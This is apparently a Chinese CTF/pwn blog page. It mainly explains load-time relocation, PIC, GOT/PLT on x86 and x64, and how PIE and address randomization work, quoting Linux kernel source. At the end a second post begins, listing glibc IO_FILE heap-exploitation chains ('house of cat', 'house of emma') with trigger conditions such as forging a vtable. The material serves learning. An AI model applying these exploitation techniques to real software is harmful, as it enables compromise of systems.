<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r libmlreloc.so</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.dyn&#x27; at offset 0x2fc contains 7entries:</span><br><span class="line"></span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00002008  00000008R_386_RELATIVE</span><br><span class="line">000004b4  00000502  R_386_PC32       0000049c   ml_util_func</span><br><span class="line">000004bf  00000401  R_386_32         0000200c   myglob</span><br><span class="line">000004c7  00000401  R_386_32         0000200c   myglob</span><br><span class="line">000004cc  00000401  R_386_32         0000200c   myglob</span><br><span class="line">[...] skipping stuff</span><br></pre></td></tr></table></figure>
<ul>
<li>3处 <code>myglob</code> 的 offset，刚好对应了 <code>ml_func</code> 中空缺 <code>myglob</code> 的地址</li>
<li>证明链接器并没有重定位所有的符号，这些 <strong>符号都是在载入可执行文件时重定位的</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> function ml_func:</span><br><span class="line">   <span class="number">0x0012e4a7</span>&lt;+<span class="number">0</span>&gt;:    <span class="number">55</span>    		 push  ebp</span><br><span class="line">   <span class="number">0x0012e4a8</span>&lt;+<span class="number">1</span>&gt;:    <span class="number">89</span> e5 		 mov   ebp,esp</span><br><span class="line">   <span class="number">0x0012e4aa</span>&lt;+<span class="number">3</span>&gt;:    <span class="number">83</span> ec <span class="number">14</span>        sub   esp,<span class="number">0x14</span></span><br><span class="line">   <span class="number">0x0012e4ad</span>&lt;+<span class="number">6</span>&gt;:    <span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>        mov   eax,DWORD PTR [ebp+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0012e4b0</span>&lt;+<span class="number">9</span>&gt;:    <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>        mov   DWORD PTR [esp],eax</span><br><span class="line">   <span class="number">0x0012e4b3</span>&lt;+<span class="number">12</span>&gt;:   e8 e4 ff ff ff  call  <span class="number">0x12e49c</span> &lt;ml_util_func&gt;</span><br><span class="line">   <span class="number">0x0012e4b8</span>&lt;+<span class="number">17</span>&gt;:   <span class="number">03</span> <span class="number">45</span> <span class="number">0</span>c        add   eax,DWORD PTR [ebp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0012e4bb</span>&lt;+<span class="number">20</span>&gt;:   <span class="number">89</span> <span class="number">45</span> fc        mov   DWORD PTR [ebp<span class="number">-0x4</span>],eax</span><br><span class="line">   <span class="number">0x0012e4be</span>&lt;+<span class="number">23</span>&gt;:   a1 <span class="number">0</span>c <span class="number">00</span> <span class="number">13</span> <span class="number">00</span>  mov   eax,ds:<span class="number">0x13000c</span></span><br><span class="line">   <span class="number">0x0012e4c3</span>&lt;+<span class="number">28</span>&gt;:   <span class="number">03</span> <span class="number">45</span> fc        add   eax,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x0012e4c6</span>&lt;+<span class="number">31</span>&gt;:   a3 <span class="number">0</span>c <span class="number">00</span> <span class="number">13</span> <span class="number">00</span>  mov   ds:<span class="number">0x13000c</span>,eax</span><br><span class="line">   <span class="number">0x0012e4cb</span>&lt;+<span class="number">36</span>&gt;:   a1 <span class="number">0</span>c <span class="number">00</span> <span class="number">13</span> <span class="number">00</span>  mov   eax,ds:<span class="number">0x13000c</span></span><br><span class="line">   <span class="number">0x0012e4d0</span>&lt;+<span class="number">41</span>&gt;:   <span class="number">03</span> <span class="number">45</span> <span class="number">0</span>c        add   eax,DWORD PTR [ebp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0012e4d3</span>&lt;+<span class="number">44</span>&gt;:   c9     		 leave</span><br><span class="line">   <span class="number">0x0012e4d4</span>&lt;+<span class="number">45</span>&gt;:   c3     		 ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<ul>
<li>载入时重定位是 Linux（及其他OS）用来解决，在将共享库载入内存时，在共享库里访问内部数据与代码的问题，时至今日，位置无关代码（PIC）是一个更流行的方法</li>
<li>一些现代系统（比如x86-64）已不再支持载入时重定位 </li>
</ul>
<p><strong>位置无关代码-x86</strong></p>
<p>载入时重定位的问题十分明显：</p>
<ul>
<li>在应用程序载入时，需要花费一些时间执行这些重定位</li>
<li>并且它使得库的代码节不可共享<ul>
<li>如果共享库的代码节可以只载入内存一次（然后映射到许多进程的虚拟内存），数目可观的 RAM 就可以被节省下来</li>
<li>但对载入时重定位这是不可能的，因为使用这个技术时，需要在载入时修改代码节来应用重定位（不同的可执行文件在装载同一个动态库的时候，重定位的结果可能不同）</li>
</ul>
</li>
<li>另外，它要求要有一个可写的代码节（它必须保持可写，以允许动态载入器执行重定位），形成了一个安全风险</li>
</ul>
<p>PIC 背后的思想是简单的：对代码中访问的所有全局数据与函数添加一层额外的抽象，通过巧妙地利用链接与载入过程中的某些工件，使得共享库的代码节真正位置无关是可能的（不做任何改变而容易地映射到不同的内存地址）</p>
<p>位置无关代码依靠一个“全局偏移表”或简称 GOT 来完成（这是位于动态库中的 GOT 表）：</p>
<ul>
<li>假设在代码节里某条指令想访问一个变量</li>
<li>指令不是通过绝对地址直接访问它，而是访问 GOT 里的一个项</li>
<li>因为 GOT 在数据节的一个已知位置，这个访问是相对的且链接器已知，而 GOT 项将包含该变量的绝对地址</li>
</ul>
<p>这样，在代码里通过 GOT 重定向变量的访问，不过我们还是要在数据节里创建一个重定位，因为要让上面描述的场景工作，GOT 仍然必须包含变量的绝对地址，这样做的好处如下：</p>
<ul>
<li>每次变量访问都要求代码节里的重定位，而在 GOT 里对每个变量我们只需要重定位一次，因此这更高效</li>
<li>数据节是可写的且不在进程间共享，因此向它添加重定位没有害处，而将重定位移出代码节使得代码节变成只读且在进程间共享</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a +<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00000477 &lt;ml_func&gt;:</span><br><span class="line"> 477:   55                      push   ebp</span><br><span class="line"> 478:   89 e5                   mov    ebp,esp</span><br><span class="line"> 47a:   53                      push   ebx</span><br><span class="line"> 47b:   83 ec 24                sub    esp,0x24</span><br><span class="line"> 47e:   e8 e4 ff ff ff          call   467 &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 483:   81 c3 71 1b 00 00       add    ebx,0x1b71</span><br><span class="line"> 489:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line"> 48c:   89 04 24                mov    DWORD PTR [esp],eax</span><br><span class="line"> 48f:   e8 0c ff ff ff          call   3a0 &lt;ml_util_func@plt&gt;</span><br><span class="line"> &lt;... snip morecode&gt;</span><br><span class="line"></span><br><span class="line">000003a0 &lt;ml_util_func@plt&gt;:</span><br><span class="line"> 3a0:   ff a3 14 00 00 00       jmp    DWORD PTR [ebx+0x14]</span><br><span class="line"> 3a6:   68 10 00 00 00          push   0x10</span><br><span class="line"> 3ab:   e9 c0 ff ff ff          jmp    370 &lt;_init+0x30&gt;</span><br><span class="line">     </span><br><span class="line">0000045a &lt;__i686.get_pc_thunk.cx&gt;:</span><br><span class="line"> 45a:   8b 0c 24                mov    ecx,DWORD PTR [esp]</span><br><span class="line"> 45d:   c3                      ret</span><br></pre></td></tr></table></figure>
<ul>
<li><code>call get_pc_thunk.bx</code> 会把其下一条指令压栈，然后就用 <code>mov</code> 把下一条指令的地址放入 <code>ebx</code> 寄存器</li>
<li>对 <code>ebx</code> 寄存器中的值进行 <code>add</code> 操作，获取 GOT 基地址，然后获取 <code>myglob</code> 的真实地址</li>
<li>访问函数时，先 <code>call</code> 其在 PLT 表中的地址，然后 <code>jmp [ebx+0x14]</code>（对应 GOT 中 <code>ml_util_func</code> 的地址）</li>
</ul>
<p>每个 PLT 项包含三个部分：</p>
<ul>
<li>到 GOT 指定地址的一个跳转（这是跳转到 [ebx + 0x14]）</li>
<li>为解析者准备参数（用于定位该函数）</li>
<li>调用解析函数</li>
</ul>
<p><strong>位置无关代码-x64</strong></p>
<p>x86设计时没有考虑 PIC，因此实现 PIC 有一点缺陷：</p>
<ul>
<li>一个显而易见的代价是 PIC 中所有对数据及代码的外部访问都要求额外的间接性，即对全局变量的每次访问，以及对函数的每次调用，都要一次额外的内存载入</li>
<li>是 PIC 的实现增加了寄存器的使用，需要一整个寄存器存放 GOT 基地址</li>
</ul>
<p>在64位模式里实现了一个新的取址形式，RIP 相对取址（相当于指令指针）：通过向指向下一条指令的64位 RIP 添加位移来构成一个有效的地址</p>
<ul>
<li>在x86中数据访问（使用 mov 指令）仅支持绝对地址</li>
<li>在x64模式也用其他指令，比如 lea </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,table        ;将table内容传送给ax寄存器</span><br><span class="line">lea ax,table        ;将table的地址传送给ax寄存器</span><br><span class="line"></span><br><span class="line">;offset是属性操作符,表示应把其后跟着的符号的地址(而不是内容)作为传送数据</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">000000000000064b &lt;ml_func&gt;:</span><br><span class="line"> 64b:   55                      push   rbp</span><br><span class="line"> 64c:   48 89 e5                mov    rbp,rsp</span><br><span class="line"> 64f:   48 83 ec 20             sub    rsp,0x20</span><br><span class="line"> 653:   89 7d ec                mov    DWORD PTR [rbp-0x14],edi</span><br><span class="line"> 656:   89 75 e8                mov    DWORD PTR [rbp-0x18],esi</span><br><span class="line"> 659:   8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line"> 65c:   89 c7                   mov    edi,eax</span><br><span class="line"> 65e:   e8 fd fe ff ff          call   560 &lt;ml_util_func@plt&gt;</span><br><span class="line"> [... snip more code ...]</span><br><span class="line"> </span><br><span class="line">0000000000000560 &lt;ml_util_func@plt&gt;:</span><br><span class="line"> 560:   ff 25 a2 0a 20 00       jmp   QWORD PTR [rip+0x200aa2]</span><br><span class="line"> 566:   68 01 00 00 00          push  0x1</span><br><span class="line"> 56b:   e9 d0 ff ff ff          jmp   540 &lt;_init+0x18&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>get_pc_thunk.bx</code> 函数没有了，程序也不会专门用一个寄存器来保存 GOT 表基地址，而是直接用 <code>rip + offset</code> 来定位 GOT 表</li>
</ul>
<p>在x86上 GOT 地址以两步被载入到某些基址寄存器：</p>
<ul>
<li>首先以一个特殊的函数调用获取指令的地址</li>
<li>然后加上到 GOT 的偏移</li>
</ul>
<p>在x64上这两步都不需要：</p>
<ul>
<li>因为到 GOT 的相对偏移对链接器是已知的</li>
<li>并且可以简单地使用 RIP 相对取址直接获取对应数据</li>
</ul>
<h2 id="PIE-的原理"><a href="#PIE-的原理" class="headerlink" title="PIE 的原理"></a>PIE 的原理</h2><p>PIC 实现了位置无关代码，如果把 PIC 的范围扩大到整个二进制文件，就形成了 PIE：地址无关可执行程序</p>
<p>执行程序时，系统的动态链接器库 ld.so 会首先加载，接着 ld.so 会通过 .dynamic 段中类型为 DT_NEED 的字段查找其他需要加载的共享库，并依次将它们加载到内存中：</p>
<ul>
<li>关闭 PIE：程序会在固定的地址开始加载，这些动态链接库每次加载的顺序和位置都一样</li>
<li>开启 PIE：因为没有绝对地址引用，所以每次加载的地址都不相同<ul>
<li>不仅动态链接库的加载地址不固定，就连执行程序每次加载的地址也不一样</li>
<li>这就要求 ld.so 首先被加载后它不仅要负责重定位其他的共享库，同时还要对可执行文件重定位</li>
</ul>
</li>
</ul>
<p>当 kernel 加载运行一个可执行文件时，会调用 <code>load_elf_binary()</code> 这个函数（这里只写出了和 PIE 有关的片段）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1/fs/binfmt_elf.c */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">load_elf_binary</span><span class="params">(struct linux_binprm *bprm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(current-&gt;personality &amp; ADDR_NO_RANDOMIZE) &amp;&amp; randomize_va_space)</span><br><span class="line">		current-&gt;flags |= PF_RANDOMIZE;</span><br><span class="line">    <span class="comment">/* 当randomize_va_space标志启用时,&#x27;flag-&gt;PF_RANDOMIZE&#x27;会被设置为&#x27;1&#x27;,确保后面的if语句可以通过 */</span></span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	retval = create_elf_tables(bprm, &amp;loc-&gt;elf_ex,</span><br><span class="line">			  load_addr, interp_load_addr);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">    <span class="comment">/* 设置代码段,数据段的起始/终止地址,设置栈的起始地址 */</span></span><br><span class="line">	current-&gt;mm-&gt;end_code = end_code;</span><br><span class="line">	current-&gt;mm-&gt;start_code = start_code;</span><br><span class="line">	current-&gt;mm-&gt;start_data = start_data;</span><br><span class="line">	current-&gt;mm-&gt;end_data = end_data;</span><br><span class="line">	current-&gt;mm-&gt;start_stack = bprm-&gt;p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((current-&gt;flags &amp; PF_RANDOMIZE) &amp;&amp; (randomize_va_space &gt; <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="comment">/* 如果&#x27;flag-&gt;PF_RANDOMIZE&#x27;被设置为&#x27;1&#x27;,就执行如下语句 */</span></span><br><span class="line">		current-&gt;mm-&gt;brk = current-&gt;mm-&gt;start_brk =</span><br><span class="line">			arch_randomize_brk(current-&gt;mm); <span class="comment">/* 用于获取随机地址 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> compat_brk_randomized</span></span><br><span class="line">		current-&gt;brk_randomized = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1/arch/kernel/process.c */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">arch_randomize_brk</span><span class="params">(struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> randomize_page(mm-&gt;brk, <span class="number">0x02000000</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1/drivers/char/random.c */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">randomize_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> range)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!PAGE_ALIGNED(start)) &#123;</span><br><span class="line">		range -= PAGE_ALIGN(start) - start;</span><br><span class="line">		start = PAGE_ALIGN(start);</span><br><span class="line">        <span class="comment">/* PAGE_ALIGN(addr):将物理地址addr修整为页边界地址(页的上边界) */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (start &gt; ULONG_MAX - range)</span><br><span class="line">		range = ULONG_MAX - start;</span><br><span class="line"></span><br><span class="line">	range &gt;&gt;= PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (range == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> start;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> start + (get_random_long() % range &lt;&lt; PAGE_SHIFT); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1/include/linux/random.h */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_random_long</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG == 64</span></span><br><span class="line">	<span class="keyword">return</span> get_random_u64();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> get_random_u32();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1/drivers/char/random.c */</span></span><br><span class="line"><span class="function">u64 <span class="title">get_random_u64</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u64 ret;</span><br><span class="line">	<span class="keyword">bool</span> use_lock;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">batched_entropy</span> *<span class="title">batch</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">void</span> *previous;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG == 64</span></span><br><span class="line">	<span class="keyword">if</span> (arch_get_random_long((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;ret))</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">if</span> (arch_get_random_long((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;ret) &amp;&amp;</span><br><span class="line">	    arch_get_random_long((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;ret + <span class="number">1</span>))</span><br><span class="line">	    <span class="keyword">return</span> ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	warn_unseeded_randomness(&amp;previous);</span><br><span class="line"></span><br><span class="line">	use_lock = READ_ONCE(crng_init) &lt; <span class="number">2</span>;</span><br><span class="line">	batch = &amp;get_cpu_var(batched_entropy_u64); <span class="comment">/* 获取本地cpu的变量 */</span></span><br><span class="line">	<span class="keyword">if</span> (use_lock)</span><br><span class="line">		read_lock_irqsave(&amp;batched_entropy_reset_lock, flags);</span><br><span class="line">	<span class="keyword">if</span> (batch-&gt;position % ARRAY_SIZE(batch-&gt;entropy_u64) == <span class="number">0</span>) &#123;</span><br><span class="line">		extract_crng((u8 *)batch-&gt;entropy_u64);</span><br><span class="line">		batch-&gt;position = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ret = batch-&gt;entropy_u64[batch-&gt;position++];</span><br><span class="line">    <span class="comment">/* 根据当前进程的batched_entropy_u64来计算出随机数 */</span></span><br><span class="line">	<span class="keyword">if</span> (use_lock)</span><br><span class="line">		read_unlock_irqrestore(&amp;batched_entropy_reset_lock, flags);</span><br><span class="line">	put_cpu_var(batched_entropy_u64);</span><br><span class="line">	<span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(get_random_u64);</span><br></pre></td></tr></table></figure>
<p>因为 PIE 使用了 PIC 中的原理（GOT + RIP 相对取址）使代码与地址无关，所以 kernel 在加载ELF文件时，可以直接使用对应的函数把 <code>current-&gt;mm-&gt;brk</code> 随机化</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/02/IO_FILE%20%E5%B8%B8%E7%94%A8%E8%B0%83%E7%94%A8%E9%93%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/02/IO_FILE%20%E5%B8%B8%E7%94%A8%E8%B0%83%E7%94%A8%E9%93%BE/" class="post-title-link" itemprop="url">IO_FILE 常用调用链（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-02 16:21:36" itemprop="dateCreated datePublished" datetime="2022-09-02T16:21:36+08:00">2022-09-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-09 18:33:55" itemprop="dateModified" datetime="2022-12-09T18:33:55+08:00">2022-12-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>house of cat</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; [_IO_wfile_seekoff] (IO_wfile_jumps)</span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>伪造 vtable = IO_wfile_jumps+0x10</li>
<li>修改 top chunk -&gt; P = 0，使 top chunk 不够分配</li>
</ul>
<p><strong>house of emma</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; [_IO_cookie_write](IO_wfile_jumps)</span><br></pre></td></tr></table></figure>
